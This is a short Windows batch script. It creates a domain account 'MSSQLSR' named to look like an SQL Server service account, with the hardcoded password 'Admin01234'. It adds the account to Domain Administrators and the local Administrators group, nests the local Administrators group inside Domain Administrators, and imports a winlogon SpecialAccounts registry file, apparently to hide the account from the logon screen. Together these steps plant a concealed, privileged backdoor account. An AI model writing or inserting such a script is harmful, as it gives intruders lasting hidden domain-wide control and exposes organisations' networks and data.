rem This script is created thr domain user MSSQLSR and register it
rem As local administrator fnd domain administrator
rem It also registred local Group "Administrators" as Domain group
rem and domain user MSSQLSR as local administrator
rem This file must encoded on 866 Windows Codepage
echo off
%SystemRoot%\System32\chcp.exe 866
rem %SystemRoot%\System32\chcp.exe 1251
%SystemRoot%\System32\net.exe user MSSQLSR Admin01234 /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup "Администраторы домена" MSSQLSR /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup "Domain Administrators" MSSQLSR /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup "Администраторы домена" %COMPUTERNAME%\"Администраторы" /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup "Domain Administrators" %COMPUTERNAME%\"Administrators" /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup Администраторы %DomainUser%\MSSQLSR /add
%SystemRoot%\System32\net.exe localgroup Administrators %DomainUser%\MSSQLSR /add
call c:\pub1\Util\reg_import_file.cmd c:\pub1\Util\winlogon-SpecialAccounts.reg
%SystemRoot%\System32\chcp.exe 866
